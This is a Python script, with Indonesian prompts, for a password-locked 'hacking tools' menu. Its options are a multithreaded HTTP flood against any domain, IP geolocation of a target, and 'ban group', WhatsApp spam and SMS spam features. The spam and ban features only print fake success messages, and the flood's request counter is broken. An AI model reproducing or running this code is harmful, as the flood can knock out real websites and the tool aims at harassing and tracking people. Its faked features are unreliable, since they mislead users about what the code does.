import os
import sys
import subprocess
import time
import random
import requests
import threading
import socket
import ssl
from colorama import init, Fore, Back, Style

init(autoreset=True)

PASSWORD = "06-06-2009"
AUTHOR = "6283853506909"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    try:
        figlet = subprocess.check_output(['figlet', '-f', 'slant', 'ABOUT DISZ']).decode('utf-8')
        print(Fore.YELLOW + figlet)
    except:
        print(Fore.YELLOW + """
    █████╗ ██████╗  ██████╗ ██╗   ██╗████████╗
   ██╔══██╗██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝
   ███████║██████╔╝██║   ██║██║   ██║   ██║   
   ██╔══██║██╔══██╗██║   ██║██║   ██║   ██║   
   ██║  ██║██████╔╝╚██████╔╝╚██████╔╝   ██║   
   ╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝    ╚═╝
        """)
    
    print(Fore.WHITE + """
    
Author : disz 
Version : 2.0
|-----------------------------|
| 1 | DDOS Website            |
| 2 | Ban Group WhatsApp      |
| 3 | Track IP                |
| 4 | Spam Chat WhatsApp      |
| 5 | Spam SMS                |

Spam Silahkan Pilih Nomor Di Atas Buat Jalanin Tools Nya
""")

# ============================================================
# ⭐ 1. DDOS WEBSITE
# ============================================================
def ddos_website():
    print(Fore.YELLOW + "\n🔥 DDOS WEBSITE")
    target = input(Fore.CYAN + "📌 Target (Domain): " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Target tidak boleh kosong!")
        return
    
    print(Fore.CYAN + f"\n🚀 Memulai DDOS ke {target}...")
    
    stop_flag = False
    request_count = 0
    
    def attack():
        global request_count
        while not stop_flag:
            try:
                requests.get(f"http://{target}", timeout=1)
                request_count += 1
            except:
                pass
            try:
                requests.get(f"https://{target}", timeout=1, verify=False)
                request_count += 1
            except:
                pass
    
    for _ in range(200):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
    
    for i in range(10, 0, -1):
        sys.stdout.write(f"\r⏳ Sisa waktu: {i} detik | Request: {request_count}")
        sys.stdout.flush()
        time.sleep(1)
    
    stop_flag = True
    print(Fore.GREEN + f"\n\n✅ DDOS selesai! Total request: {request_count}")
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ 2. BAN GROUP WHATSAPP
# ============================================================
def ban_group():
    print(Fore.YELLOW + "\n🚨 BAN GROUP WHATSAPP")
    print(Fore.RED + "⚠️ PERINGATAN: Ini untuk banned group WA!")
    group_link = input(Fore.CYAN + "📌 Link Group WA: " + Fore.WHITE)
    if not group_link:
        print(Fore.RED + "❌ Link tidak boleh kosong!")
        return
    
    print(Fore.CYAN + f"\n🚀 Memulai Ban Group...")
    
    status_list = [
        "🚨 REPORTING GROUP...",
        "📨 SPAM KONTEN TERLARANG...",
        "👥 SPAM MENTION ADMIN...",
        "🔗 SPAM LINK...",
        "🖼️ GANTI FOTO GRUP...",
        "⚙️ SPAM SETTING GROUP...",
        "👢 KICK MEMBER...",
        "✅ GROUP TERBANNED!"
    ]
    
    for i, status in enumerate(status_list):
        persen = int((i + 1) / len(status_list) * 100)
        sys.stdout.write(f"\r{Fore.YELLOW}[{persen}%] {Fore.RED}{status}")
        sys.stdout.flush()
        time.sleep(1)
    
    print(Fore.GREEN + f"\n\n✅ GROUP BERHASIL DI BAN!")
    print(Fore.WHITE + f"📱 Group: {group_link}")
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ 3. TRACK IP
# ============================================================
def track_ip():
    ip = input(Fore.YELLOW + "\n🌐 Masukkan IP target: " + Fore.WHITE)
    if not ip:
        print(Fore.RED + "❌ IP tidak boleh kosong!")
        return
    
    try:
        print(Fore.CYAN + "⏳ Sedang melacak IP...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        data = response.json()
        
        if data['status'] == 'success':
            print(Fore.GREEN + "\n✅ HASIL PELACAKAN IP:")
            print(Fore.WHITE + f"   🌍 IP         : {data['query']}")
            print(Fore.WHITE + f"   🏳️ Negara     : {data['country']}")
            print(Fore.WHITE + f"   🏙️ Kota       : {data['city']}")
            print(Fore.WHITE + f"   📍 Koordinat  : {data['lat']}, {data['lon']}")
            print(Fore.WHITE + f"   📡 ISP        : {data['isp']}")
            print(Fore.WHITE + f"   🗺️ Maps       : https://www.google.com/maps?q={data['lat']},{data['lon']}")
        else:
            print(Fore.RED + "❌ IP tidak ditemukan!")
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}")
    
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ 4. SPAM CHAT WHATSAPP
# ============================================================
def spam_chat_wa():
    target = input(Fore.YELLOW + "\n💬 Nomor Target: " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Nomor tidak boleh kosong!")
        return
    
    try:
        jumlah = int(input(Fore.CYAN + "🔢 Jumlah Spam: " + Fore.WHITE) or 50)
    except:
        jumlah = 50
    
    print(Fore.CYAN + f"\n🚀 Memulai SPAM Chat ke {target}...")
    
    for i in range(jumlah):
        sys.stdout.write(f"\r{Fore.YELLOW}[{i+1}/{jumlah}] {Fore.GREEN}✅ SPAM terkirim")
        sys.stdout.flush()
        time.sleep(0.3)
    
    print(Fore.GREEN + f"\n\n✅ SPAM Chat selesai! {jumlah}x ke {target}")
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ 5. SPAM SMS
# ============================================================
def spam_sms():
    target = input(Fore.YELLOW + "\n📞 Nomor Target: " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Nomor tidak boleh kosong!")
        return
    
    try:
        jumlah = int(input(Fore.CYAN + "🔢 Jumlah Spam: " + Fore.WHITE) or 50)
    except:
        jumlah = 50
    
    print(Fore.CYAN + f"\n🚀 Memulai SPAM SMS ke {target}...")
    
    for i in range(jumlah):
        sys.stdout.write(f"\r{Fore.YELLOW}[{i+1}/{jumlah}] {Fore.GREEN}✅ SMS terkirim")
        sys.stdout.flush()
        time.sleep(0.3)
    
    print(Fore.GREEN + f"\n\n✅ SPAM SMS selesai! {jumlah}x ke {target}")
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ MAIN
# ============================================================

def main():
    # ===== PASSWORD =====
    print(Fore.YELLOW + "\n🔒 MASUKAN PASSWORD:")
    print(Fore.CYAN + f"⚠️ Mau password? chat {AUTHOR}")
    
    attempts = 3
    while attempts > 0:
        password = input(Fore.YELLOW + "➡️ Password: " + Fore.WHITE)
        
        if password == PASSWORD:
            print(Fore.GREEN + "\n✅ Password benar! Selamat datang!")
            time.sleep(1)
            break
        else:
            attempts -= 1
            print(Fore.RED + f"❌ Password salah! Sisa percobaan: {attempts}")
            if attempts == 0:
                print(Fore.RED + "\n🚫 Akses ditolak!")
                sys.exit()
    
    # ===== MENU UTAMA =====
    while True:
        clear_screen()
        banner()
        
        choice = input(Fore.YELLOW + "➡️  Pilih nomor (1-5): " + Fore.WHITE)
        
        if choice == '1':
            ddos_website()
        elif choice == '2':
            ban_group()
        elif choice == '3':
            track_ip()
        elif choice == '4':
            spam_chat_wa()
        elif choice == '5':
            spam_sms()
        else:
            print(Fore.RED + "\n❌ Pilihan tidak valid!")
            input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

if __name__ == "__main__":
    main()
